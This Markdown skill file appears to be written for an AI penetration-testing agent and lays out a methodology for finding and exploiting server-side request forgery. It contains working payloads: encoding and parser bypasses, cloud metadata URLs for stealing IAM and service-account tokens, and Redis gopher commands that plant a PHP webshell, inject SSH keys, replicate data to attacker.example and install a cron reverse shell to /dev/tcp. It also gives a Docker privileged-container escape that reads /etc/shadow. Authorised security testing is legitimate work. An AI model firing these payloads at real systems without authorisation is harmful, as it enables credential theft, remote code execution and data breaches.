---
name: ssrf-testing
description: Detect and exploit server-side request forgery — blind confirmation, filter bypass decision trees, cloud metadata reality, post-SSRF exploitation of internal services
origin: AI Threat Hunting
---

# SSRF Testing

**REALITY:** Blind SSRF is 10x more common than SSRF with response. Most real SSRF findings are confirmed via OOB callbacks or timing, not by reading /etc/passwd in the response. If you are only testing `?url=http://169.254.169.254/latest/meta-data/` and reading the response body, you are missing 90% of the attack surface.

## When to Activate

- Parameter accepts URL, hostname, or resource identifier
- PDF/document generators that fetch remote resources (wkhtmltopdf, Puppeteer, WeasyPrint)
- File upload via URL ("import from URL", "fetch from link")
- Webhook configuration endpoints (Slack integrations, CI/CD callbacks, notification URLs)
- Preview/thumbnail generators (link unfurlers, OG tag fetchers, screenshot services)
- OAuth callback URLs, OpenID discovery endpoints
- SVG/XML processors that resolve external entities (SSRF via XXE is a distinct vector)
- API integrations with user-controllable destination (proxy endpoints, federation, RSS/Atom feed parsers)

## Tools

- `curl` — manual SSRF probing and payload delivery
- OOB callback client — use `aith oob status --json` for readiness and `aith oob client logs <name>` for correlated hits
- Gopherus — gopher protocol payload generation for Redis, MySQL, SMTP exploitation

---

## Operational Methodology

### Step 1: Identify SSRF-Susceptible Parameters

Do not limit yourself to `url=`. The following parameter names and functional patterns are all SSRF vectors in real engagements:

**Obvious parameters:** `url=`, `uri=`, `src=`, `dest=`, `redirect=`, `feed=`, `link=`, `target=`, `proxy=`, `fetch=`, `load=`, `resource=`

**Functional patterns that hide SSRF:**
- Webhook URLs — `callback_url=`, `webhook=`, `notify_url=`, `postback=`
- Import/fetch — "Import from URL", "Add from link", any file-from-URL upload
- Preview/unfurl — link preview generators, OG tag fetchers, social card generators
- PDF/screenshot — wkhtmltopdf, Puppeteer-based renderers, HTML-to-PDF converters
- Avatar/image — "Set avatar from URL", image proxy endpoints
- XML/SVG processing — SSRF via XXE (DTD external entity resolution)
- OAuth/OIDC — `redirect_uri=`, `.well-known/openid-configuration` fetchers
- API federation — GraphQL federation URLs, microservice routing, internal API gateways

**Discovery technique:** Intercept all outbound requests during normal application use. Any feature that causes the server to make an HTTP request is a candidate. Look for parameters in POST bodies, JSON payloads, and HTTP headers — not just query strings.

### Step 2: Confirm with OOB Callback

OOB callback is the fastest confirmation method. If `aith oob status --json`
shows healthy shared infrastructure, use the named client URL first.

```bash
# Use the unique URL from `aith oob client logs <name> --lines 80`
?url=http://$OOB_CALLBACK_URL/ssrf-confirm

# If no OOB available, use timing differential:
# Internal host (fast): ?url=http://127.0.0.1:1/ (connection refused = fast fail)
# External host (slow): ?url=http://nonexistent.internal.corp:80/ (DNS timeout = slow)
# Compare response times. >3 second differential = strong signal.

# Time-based with controlled delay:
?url=http://127.0.0.1:22/ (SSH banner = slight delay vs immediate rejection)
```

**If no OOB available and timing is inconclusive:** fall back to error-based detection. Different internal vs external error messages (connection refused vs timeout vs DNS failure) confirm the server is making requests.

### Step 3: Determine SSRF Type

The type determines your entire exploitation path. Classify before spending time on payloads.

| Type | Signal | Exploitation Value |
|------|--------|--------------------|
| **Full response** | Server response body returned to you | Highest — read internal services, cloud metadata, files |
| **Status code only** | 200 vs 500, or "success" vs "error" | Medium — boolean oracle, port scanning, some metadata |
| **Partial (content-length/headers)** | Response size or headers leak through error messages | Medium — content-length oracle can exfiltrate data bit-by-bit |
| **Blind** | OOB callback confirms request, no response data | Low for direct data theft, high for internal service interaction via gopher/POST |
| **Timing only** | Response time differential only | Lowest — port scanning, existence checks only |

### Step 4: Select Exploitation Path Based on Type

**Full response SSRF:** Read cloud metadata, internal services, local files. This is the straightforward path — proceed to Cloud Metadata and Post-SSRF Exploitation sections.

**Status code / partial SSRF:** Port scan internal network. Use content-length differences to fingerprint services. If status code reflects whether the internal request succeeded, use it as a boolean oracle to brute-force internal paths.

**Blind SSRF:** Cannot read responses but CAN make the server send requests. Exploitation via:
- Gopher protocol to interact with internal services (Redis, SMTP, MySQL)
- POST-based SSRF to trigger actions on internal APIs (no response needed)
- DNS rebinding to pivot the server into making requests to attacker-controlled IP

**Timing only:** Limited to confirming internal host/port existence. Document as informational unless you can chain it.

---

## Filter Bypass Decision Tree

Not all bypasses work against all stacks. The ACTUAL URL parsing library determines what works. Test the library, not the theory.

### If Allowlist-Based (only specific domains/IPs allowed)

DNS rebinding is your primary option. Success rate: ~20% (race condition dependent).

```
# rbndr.us — alternates between two IPs on each DNS resolution
# 7f000001.ALLOWED_IP_HEX.rbndr.us
# rebind.it — similar service

# Technique: First resolution -> allowed IP (passes check)
#            Second resolution -> 127.0.0.1 (actual fetch hits internal)
# Requires: two separate DNS lookups (validation vs fetch) AND no DNS caching between them
```

**DNS rebinding requires the target to NOT cache DNS.** If the application caches DNS resolution between the allowlist check and the actual fetch (most production HTTP clients do), your window is gone. Java's `InetAddress` caches for 30 seconds by default. Go's resolver caches. Python's `requests` does NOT cache (better odds).

### If Blocklist-Based (blocks 127.0.0.1, 169.254.x.x, 10.x.x.x, etc.)

Try in this order (most likely to work first):

```
# 1. IP encoding variants (decimal, hex, octal, mixed)
http://2130706433/           # 127.0.0.1 as decimal integer
http://0x7f000001/           # 127.0.0.1 as hex
http://0177.0.0.01/          # 127.0.0.1 as octal
http://0x7f.0x0.0x0.0x1/    # 127.0.0.1 as dotted hex
http://[::ffff:127.0.0.1]/  # IPv6-mapped IPv4
http://[::1]/                # IPv6 localhost
http://127.1/                # Abbreviated (some parsers accept)
http://0/                    # Some systems resolve 0 to localhost

# 2. URL parsing tricks (parser differential between validator and fetcher)
http://attacker.example@127.0.0.1/         # Credential section — some parsers use host after @
http://127.0.0.1#@allowed.com/         # Fragment confusion
http://allowed.com\@127.0.0.1/         # Backslash normalization differences
http://127.0.0.1%00@allowed.com/       # Null byte truncation (rare, older parsers)

# 3. Redirect chains (if the blocklist checks the initial URL but follows redirects)
http://attacker.example/redirect?url=http://127.0.0.1/
# Host your own redirect: HTTP 302 Location: http://169.254.169.254/

# 4. DNS pointing to internal IP
# Register a domain, set A record to 127.0.0.1
# localtest.me, vcap.me, and spoofed.burpcollaborator.net all resolve to 127.0.0.1
```

**CRITICAL: Most modern URL parsers are NOT vulnerable to basic IP encoding tricks.** Python `requests`, Go `net/http`, Node `axios`, and Java `HttpURLConnection` all resolve the hostname before fetching and apply blocklist checks post-resolution in most SSRF-aware configurations. These tricks work against naive regex-based blocklists that check the URL string, NOT against parsers that resolve first. Test the ACTUAL library the application uses.

### If Protocol-Restricted to HTTP/HTTPS

```
# Redirect to gopher:// — works on ~15% of URL libraries
# Host a redirect: HTTP 302 Location: gopher://127.0.0.1:6379/_INFO
# Python urllib follows cross-protocol redirects. requests does NOT.
# Java HttpURLConnection does NOT. curl DOES (without --proto).

# Redirect to file:// — even rarer
# HTTP 302 Location: file:///etc/passwd
# Almost no modern HTTP client follows this. Worth one test.
```

---

## Cloud Metadata — What Actually Works in 2024+

### AWS

**IMDSv1 is increasingly rare.** AWS enforces IMDSv2 on new instances by default since 2024. IMDSv2 requires a PUT request to get a token, then the token in a header for metadata requests. Standard SSRF (GET-only) cannot exploit IMDSv2 unless you can control the HTTP method and headers.

```
# IMDSv1 (still test — legacy instances exist, especially in dev/staging)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data

# IMDSv2 — requires PUT + header (only exploitable if SSRF allows method/header control)
# Step 1: PUT http://169.254.169.254/latest/api/token (Header: X-aws-ec2-metadata-token-ttl-seconds: 21600)
# Step 2: GET http://169.254.169.254/latest/meta-data/ (Header: X-aws-ec2-metadata-token: TOKEN)
# If your SSRF is GET-only with no header control, IMDSv2 blocks you. Move on.

# ECS container credentials (different endpoint, often overlooked)
http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

**The real prize is not the metadata itself — it is the IAM role credentials.** Temporary credentials from the instance role let you:
- Enumerate and read S3 buckets (`aws s3 ls`, `aws s3 cp`)
- Assume other roles (`aws sts assume-role`)
- List and invoke Lambda functions
- Read Secrets Manager / Parameter Store values
- Query RDS, DynamoDB, or other services the role has access to

Always run `aws sts get-caller-identity` with stolen creds to understand what role you have, then enumerate permissions.

### GCP

**GCP requires the `Metadata-Flavor: Google` header on all metadata requests.** Standard GET-only SSRF without header control cannot read GCP metadata. You need either:
- SSRF that allows custom headers
- CRLF injection to inject the header into the request
- The legacy `v1beta1` endpoint (deprecated, may still work on old instances)

```
# Requires Metadata-Flavor: Google header
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/

# Legacy endpoint (no header required — test first, often disabled)
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

### Azure

```
# Requires Metadata: true header
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Kubernetes (often the most accessible target)

```
# Service account token — file read via SSRF or file:// protocol
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace

# Kubernetes API — if network policy allows pod-to-API-server traffic
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/secrets
```

### DigitalOcean

```
# No header requirement — straightforward
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
http://169.254.169.254/metadata/v1/user-data
```

---

## Post-SSRF Exploitation

Once you have confirmed SSRF (especially full-response or gopher-capable blind SSRF), these are the internal services worth targeting and the specific exploitation techniques for each.

### Internal Service Discovery

**Priority ports to scan via SSRF:**

| Port | Service | Why It Matters |
|------|---------|----------------|
| 6379 | Redis | Usually unauthenticated. Webshell, data theft, key dumping |
| 9200 | Elasticsearch | Usually unauthenticated. Read all indices, execute scripts |
| 2375/2376 | Docker API | Create privileged container = host root |
| 10250/10255 | Kubelet | Pod listing, exec into containers |
| 8500 | Consul | KV store with secrets, service discovery |
| 27017 | MongoDB | Often unauthenticated in internal networks |
| 5984 | CouchDB | Admin party (default no auth) |
| 11211 | Memcached | Read cached session data, credentials |
| 3306 | MySQL | Gopher exploitation if no auth |
| 5432 | PostgreSQL | Gopher exploitation if no auth |
| 8080/8443 | Internal web apps | Admin panels, monitoring dashboards |
| 9090 | Prometheus | Metrics with secrets, internal URLs |

### Redis Exploitation via Gopher

Redis is the most common post-SSRF win because it is almost always unauthenticated on internal networks.

```bash
# Verify Redis is running (full-response SSRF)
http://127.0.0.1:6379/

# Using Gopherus for payload generation:
gopherus --exploit redis

# Specific exploitation techniques:

# 1. Webshell via Redis (if Redis can write to web root)
# gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html
# gopher://127.0.0.1:6379/_CONFIG SET dbfilename shell.php
# gopher://127.0.0.1:6379/_SET payload "<?php system($_GET['cmd']); ?>"
# gopher://127.0.0.1:6379/_SAVE

# 2. Data theft via SLAVEOF (replicate Redis data to attacker server)
# gopher://127.0.0.1:6379/_SLAVEOF attacker.example 6379
# All Redis data replicates to your server

# 3. SSH key injection (if Redis user has home directory)
# gopher://127.0.0.1:6379/_CONFIG SET dir /home/redis/.ssh
# gopher://127.0.0.1:6379/_CONFIG SET dbfilename authorized_keys
# gopher://127.0.0.1:6379/_SET key "ssh-rsa AAAA..."
# gopher://127.0.0.1:6379/_SAVE

# 4. Cron job (if Redis can write to /var/spool/cron/)
# gopher://127.0.0.1:6379/_CONFIG SET dir /var/spool/cron/
# gopher://127.0.0.1:6379/_CONFIG SET dbfilename root
# gopher://127.0.0.1:6379/_SET cron "\n* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n"
# gopher://127.0.0.1:6379/_SAVE
```

### Elasticsearch / Kibana

```
# List all indices (full-response SSRF)
http://127.0.0.1:9200/_cat/indices?v

# Read index data (look for users, sessions, credentials)
http://127.0.0.1:9200/INDEX_NAME/_search?pretty&size=100

# Cluster info
http://127.0.0.1:9200/_cluster/health
http://127.0.0.1:9200/_nodes

# Script execution (Elasticsearch < 7.x or with scripting enabled)
# POST to /_search with script body via gopher
```

### Docker API

Unauthenticated Docker API = instant host root.

```
# List containers
http://127.0.0.1:2375/containers/json

# Create privileged container with host filesystem mounted
# Requires POST — use gopher:// for blind SSRF
# POST /containers/create
# {"Image":"alpine","Cmd":["cat","/host/etc/shadow"],"Binds":["/:/host"],"Privileged":true}

# Start the container
# POST /containers/CONTAINER_ID/start
```

### Kubernetes API

```
# With stolen service account token:
# List all secrets in namespace
https://kubernetes.default.svc/api/v1/namespaces/default/secrets

# List pods
https://kubernetes.default.svc/api/v1/pods

# If ClusterAdmin service account (rare but devastating):
https://kubernetes.default.svc/api/v1/secrets  # All secrets, all namespaces
```

---

## Failure Modes — When SSRF Testing Will Not Work

Understand these before investing hours on a dead end.

**URL validation libraries that actually prevent SSRF:**
- `ssrf-filter` (Node) — resolves DNS then validates the IP, blocks private ranges post-resolution. Bypass is unlikely without DNS rebinding with a very tight race.
- `ssrfcheck` / `ssrf-guard` (Python) — similar DNS-resolve-then-check approach.
- Cloud provider SSRF protections (AWS VPC endpoint policies, GCP VPC Service Controls) — network-level blocking that no URL trick bypasses.
- Web Application Firewalls with SSRF rulesets — Cloudflare, AWS WAF, Akamai inspect outbound request patterns.

If the application uses one of these, basic bypass techniques will not work. DNS rebinding is your remaining option, and its success rate is ~20%.

**DNS rebinding fails when:**
- The application caches DNS between validation and fetch (Java default, Go default, most production configurations)
- The application resolves DNS only once and reuses the connection
- The DNS TTL is respected and your rebinding service returns TTL > 0 on the first response

**Gopher protocol is blocked when:**
- The HTTP client does not support gopher (Python `requests`, Node `axios`, Go `net/http` — none support gopher natively)
- The HTTP client does not follow cross-protocol redirects
- Only `curl` and Python `urllib`/`urllib2` reliably support gopher in common deployments

**IMDSv2 blocks standard SSRF when:**
- The SSRF only allows GET requests (IMDSv2 requires PUT for token)
- The SSRF does not allow custom headers (IMDSv2 requires `X-aws-ec2-metadata-token` header)
- The instance has `HttpPutResponseHopLimit=1` and the request traverses a container boundary (Docker, ECS)

**The feature simply proxies without server-side fetching:**
- Client-side redirects (`window.location = url`) are NOT SSRF — the browser makes the request, not the server
- JavaScript-only URL handling (React/Angular link generators) — no server-side request occurs

---

## Kill Signals — Stop Testing When
- Application uses SSRF-safe URL library (ssrf-filter, ssrfcheck) confirmed via error messages → bypass unlikely, move on
- All IP encoding, DNS rebinding, and redirect chain bypasses fail after 15+ attempts → blocklist is robust, move on
- OOB callback confirms SSRF but response is not returned AND no internal services are reachable → record as blind SSRF (MEDIUM), stop exploitation
- Cloud metadata returns IAM credentials → CRITICAL, record immediately, stop testing other SSRF vectors

## Escalate When
- An OAST/Collaborator callback lands from any payload — even to a whitelisted domain — the server is fetching on your behalf, now enumerate which other schemes, ports, and internal hosts it will reach
- Response time for an internal-looking target (127.0.0.1, 169.254.169.254, localhost-only ports, RFC1918 ranges) differs measurably from an external target even when bodies are identical — timing side channels survive when body parity does not
- An error body, stack trace, redirect Location header, or Content-Length delta leaks an internal hostname, IP, cloud-metadata path, or closed-vs-open port oracle — partial SSRF still chains to IMDS and internal APIs
- The parameter accepts a non-http(s) scheme (gopher://, dict://, file://, ftp://, ldap://) without a parser error, or DNS resolves before the blocklist check — URL-parser/fetcher split is a classic bypass surface and DNS rebinding is live
- The application exposes avatar-fetch, URL preview, webhook tester, PDF/HTML render, OEmbed, RSS import, or image-import functionality — these are persistent high-value SSRF entry points, exhaust scheme/host/redirect-chain variants before moving on

## A->B Signal: SSRF Chains

```
Blind SSRF -> OOB confirm -> gopher to Redis -> webshell -> RCE
Full SSRF -> AWS IMDSv1 -> IAM creds -> S3 bucket access -> data breach
Full SSRF -> Kubernetes API -> service account token -> cluster admin -> all secrets
Blind SSRF -> gopher to internal API -> POST to admin endpoint -> account takeover
SSRF -> Docker API -> privileged container -> host root -> lateral movement
SSRF -> Elasticsearch -> read user indices -> credential extraction -> account takeover
Partial SSRF -> content-length oracle -> bit-by-bit metadata exfiltration -> IAM creds
SSRF + CRLF injection -> GCP metadata with Metadata-Flavor header -> service account token
```

## What to Record

- Vulnerable parameter and endpoint
- SSRF type (full response, status-code-only, partial, blind, timing-only)
- OOB callback confirmation from `aith oob client logs <name>` (for blind SSRF)
- Filter bypass technique used (encoding, redirect chain, DNS rebinding)
- Internal services or metadata accessed — confirming an OOB callback fired is not enough; you must show the **attacker outcome** (e.g., full SSRF returned AWS IAM credentials from 169.254.169.254 and those credentials granted `s3:ListBucket` on the production data bucket exposing 50,000 customer records; blind SSRF via gopher reached the unauthenticated Redis instance on port 6379 and set a cron job payload achieving RCE as www-data; SSRF to the internal Docker API at `127.0.0.1:2375` listed running containers and the privileged container creation command confirmed host root access)
- Full request/response or OOB evidence for reproducibility

---

## Extended Resources

- `agent/references/payloads/ssrf-payloads.md` — URL schemas, IP bypass, cloud metadata (AWS/GCP/Azure)
- `agent/references/api-security/API07-ssrf.md` — OWASP API Security Top 10:2023 SSRF checklist
